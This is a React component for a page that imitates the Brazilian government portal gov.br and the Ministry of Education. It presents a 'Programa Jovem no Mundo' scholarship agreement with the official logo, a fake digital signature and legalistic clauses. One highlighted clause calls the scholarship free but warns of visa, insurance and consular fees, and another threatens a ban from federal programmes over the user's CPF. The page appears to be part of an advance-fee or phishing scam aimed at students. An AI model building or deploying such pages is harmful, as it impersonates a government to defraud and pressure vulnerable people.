import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

export default function TermoCompromisso() {
  const navigate = useNavigate()
  const [scrolledEnd, setScrolledEnd] = useState(false)
  const [accepted, setAccepted] = useState(false)
  const [submitting, setSubmitting] = useState(false)
  const [userName, setUserName] = useState('ESTUDANTE')

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    const name = localStorage.getItem('user_name')
    if (name) setUserName(name.toUpperCase())
  }, [])

  function onScroll(e) {
    const el = e.currentTarget
    if (el.scrollHeight - el.scrollTop - el.clientHeight < 4) {
      setScrolledEnd(true)
    }
  }

  function sign() {
    if (!accepted || submitting) return
    setSubmitting(true)
    setTimeout(() => navigate('/agendar-prova'), 1200)
  }

  const sigText = accepted
    ? `Signatário Jurídico: ${userName} | Timestamp Oficial: ${new Date().toLocaleString(
        'pt-BR'
      )}`
    : null

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <span className="text-gray-500">Termo de Ciência e Compromisso</span>
        </div>

        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 800,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-6 uppercase border-b pb-4">
            Termo de Ciência e Compromisso Estudantil
          </h1>
          <p className="text-sm text-gray-600 mb-6">
            Leia atentamente as diretrizes abaixo antes de formalizar sua
            alocação no programa internacional.
          </p>

          <div
            onScroll={onScroll}
            style={{
              background: '#f8fafc',
              border: '2px solid #cbd5e1',
              borderRadius: 4,
              padding: 25,
              height: 350,
              overflowY: 'scroll',
              fontSize: 13,
              lineHeight: 1.6,
              color: '#475569',
              marginBottom: 25,
              textAlign: 'justify',
            }}
          >
            <p style={{ marginBottom: 15 }}>
              <strong>1. DO OBJETO:</strong> O presente termo tem como
              finalidade estabelecer o compromisso do beneficiário selecionado
              para o Programa Jovem no Mundo, promovido pelo Ministério da
              Educação (MEC) com fundos internacionais.
            </p>
            <p style={{ marginBottom: 15 }}>
              <strong>2. DOS BENEFÍCIOS:</strong> O Estado arcará integralmente
              com as despesas acadêmicas (mensalidades), passagens aéreas,
              pacote de imersão (Kit Conexão) e subsídio mensal local,
              garantindo que o fator econômico não seja um limitador para a
              participação do estudante brasileiro.
            </p>
            <p style={{ marginBottom: 15 }}>
              <strong>3. DOS COMPROMISSOS DO BENEFICIÁRIO:</strong> O
              selecionado compromete-se a: (a) Manter frequência escolar igual
              ou superior a 85% durante o período de preparo; (b) Representar
              dignamente o Brasil, pautando-se pelo respeito às leis do país de
              destino; (c) Concluir a formação exigida e participar da etapa
              presencial do projeto.
            </p>
            <p style={{ marginBottom: 15 }}>
              <strong>4. DA DOCUMENTAÇÃO CIVIL E CONSULAR:</strong>{' '}
              <span style={{ background: '#fef9c3', fontWeight: 'bold', padding: 2 }}>
                Fica o beneficiário ciente de que, embora a bolsa de estudos
                seja integral (100% gratuita), a emissão do e-Visa estudantil,
                seguro saúde obrigatório e emissão de documentações consulares
                locais demandam o rito burocrático e eventuais taxas relativas
                à imigração e emissão documental.
              </span>{' '}
              O MEC não subsidia custos consulares de despachantes locais.
            </p>
            <p style={{ marginBottom: 15 }}>
              <strong>5. DA NATUREZA PRESENCIAL:</strong> O candidato
              declara-se ciente de que a etapa de avaliação de competências
              será estritamente PRESENCIAL na instituição regional selecionada
              previamente, cabendo ao candidato o deslocamento na data
              informada, munido de identificação civil oficial com foto ou
              Passaporte válido.
            </p>
            <p style={{ marginBottom: 15 }}>
              <strong>6. DA EXCLUSIVIDADE DA VAGA:</strong> Ao assinar este
              termo digitalmente, o CPF do solicitante será vinculado
              irreversivelmente à vaga na instituição internacional
              pré-selecionada. O abandono injustificado acarretará bloqueio
              temporário em programas federais de bolsas.
            </p>
            <p
              style={{
                marginTop: 32,
                paddingTop: 16,
                borderTop: '1px solid #d1d5db',
              }}
            >
              Eu, devidamente qualificado nos registros do sistema nacional,
              concordo integralmente com as cláusulas deste edital.
            </p>
          </div>

          {!scrolledEnd && (
            <div
              style={{
                backgroundColor: '#fff3cd',
                color: '#856404',
                padding: 15,
                border: '1px solid #ffeeba',
                borderRadius: 4,
                textAlign: 'center',
                fontSize: 14,
                fontWeight: 'bold',
                marginBottom: 25,
              }}
            >
              ↓ Role o documento até o final para habilitar o botão de aceite. ↓
            </div>
          )}

          {scrolledEnd && (
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 10,
                marginBottom: 25,
                padding: 15,
                border: '1px solid #c3e6cb',
                backgroundColor: '#d4edda',
                borderRadius: 4,
              }}
            >
              <input
                type="checkbox"
                id="acceptCheck"
                checked={accepted}
                onChange={(e) => setAccepted(e.target.checked)}
                className="w-6 h-6 accent-green-600"
              />
              <label
                htmlFor="acceptCheck"
                className="text-sm font-bold text-green-900 cursor-pointer"
              >
                Li o documento em sua totalidade, compreendo e aceito as
                condições oficiais.
              </label>
            </div>
          )}

          <div className="text-center font-mono text-gray-400 text-xs mb-6">
            {accepted ? (
              <>
                <div className="text-green-600 font-bold mb-1">
                  ✓ ASSINATURA DIGITAL PRONTA E VALIDADA
                </div>
                {sigText}
              </>
            ) : (
              'Aguardando aceite jurídico para geração de assinatura digital...'
            )}
          </div>

          <button
            onClick={sign}
            disabled={!accepted || submitting}
            style={{
              backgroundColor: accepted && !submitting ? '#1351b4' : '#9ca3af',
              color: 'white',
              padding: 16,
              borderRadius: 30,
              fontWeight: 'bold',
              width: '100%',
              textTransform: 'uppercase',
              cursor: accepted && !submitting ? 'pointer' : 'not-allowed',
              border: 'none',
              fontSize: 15,
              transition: 'background-color 0.3s',
              boxShadow:
                '0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1)',
            }}
          >
            {submitting
              ? 'Emitindo Certificado e Guia...'
              : 'Assinar Eletronicamente e Prosseguir'}
          </button>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
